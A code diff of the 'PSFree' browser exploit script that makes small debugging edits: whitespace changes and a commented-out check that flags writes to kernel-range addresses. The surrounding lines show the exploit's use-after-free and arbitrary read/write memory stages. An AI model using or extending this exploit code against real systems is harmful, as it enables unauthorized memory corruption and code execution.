@@ -816,10 +816,10 @@ window.run_psfree = async function(target) {
     debug_log('PSFree: UaF SSV');
     const [fsets, indices] = prepare_uaf()
     const view = await uaf_ssv(fsets, indices[1]);
-
+    
     debug_log('PSFree: get string relative read primitive');
     const rdr = await make_rdr(view);
-
+    
     // make view2 now as to prevent earlier StringImpls from getting allocated
     // near it. that slows down the loop at make_arw() since it prevents the
     // the m_constantRegisters allocation from reusing the memory near view2.
@@ -833,6 +833,19 @@ window.run_psfree = async function(target) {
 
     debug_log('PSFree: achieve arbitrary read/write primitive');
     await make_arw(rdr, view2, pop);
+
+    // /**
+    //  * @param {int64} addr 
+    //  */
+    // function alertBacktraceIfNonUserspaceAddress(addr) {
+    //     if (((addr.hi & 0xffff8000) >>> 0) === 0xffff8000) {
+    //         try {
+    //             throw new Error();
+    //         } catch (error) {
+    //             alert(`Tried to write to an invalid userspace address: 0x${addr.toString(16)}\n${error.stack}`);
+    //         }
+    //     }
+    // }
 
     let prim = {
         read1(addr) {
@@ -860,21 +873,25 @@ window.run_psfree = async function(target) {
         },
 
         write1(addr, value) {
+            // alertBacktraceIfNonUserspaceAddress(addr);
             addr = new Int(addr.low, addr.hi);
             mem.write8(addr, value);
         },
-
+        
         write2(addr, value) {
+            // alertBacktraceIfNonUserspaceAddress(addr);
             addr = new Int(addr.low, addr.hi);
             mem.write16(addr, value);
         },
-
+        
         write4(addr, value) {
+            // alertBacktraceIfNonUserspaceAddress(addr);
             addr = new Int(addr.low, addr.hi);
             mem.write32(addr, value);
         },
-
+        
         write8(addr, value) {
+            // alertBacktraceIfNonUserspaceAddress(addr);
             addr = new Int(addr.low, addr.hi);
             if (value instanceof int64) {
                 value = new Int(value.low, value.hi);
